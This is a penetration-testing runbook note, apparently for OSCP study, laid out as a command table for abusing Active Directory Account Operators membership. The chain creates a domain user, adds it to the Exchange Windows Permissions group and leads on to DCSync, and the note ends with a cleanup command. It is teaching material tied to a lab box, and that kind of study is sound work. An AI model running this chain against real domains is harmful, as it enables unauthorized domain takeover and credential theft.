---
tags: [oscp, active-directory, account-operators, acl-abuse, runbook]
box_sources: [Forest]
---

# AD - Account Operators Abuse

*Use Account Operators to create a controlled user, place it in an exposed delegated group, and continue through the resulting ACL.*

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| `whoami /groups` | `BUILTIN\\Account Operators` is present | Current user has the group membership | Account Operators is not Domain Admin. Check the target groups before acting | Create `$Username2` | [[AD - ACL Enumeration]] |
| `net user $Username2 $Password2 /add /domain` | Command completes successfully | Account Operators can create domain users | Verify the object before using it | Add to delegated group | [[AD - ACL Enumeration]] |
| `net group "Exchange Windows Permissions" $Username2 /add /domain` | Membership appears in the group output | The Exchange group exists and accepts the new user | Start a fresh session so the new group token is present | [[AD - DCSync]] | [[AD - ACL Enumeration]] |

## Decision point

If `Exchange Windows Permissions` is absent, do not force this chain. Return to ACL enumeration and BloodHound to find another writable object.

## Cleanup

```cmd
net user $Username2 /delete /domain
```

## Module Links

[[22. Active Directory Introduction and Enumeration]]
[[23. Attacking Active Directory Authentication]]

## External Resources

- [HackTricks - Active Directory Methodology](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology)
- [Microsoft - Active Directory Security Groups](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups)
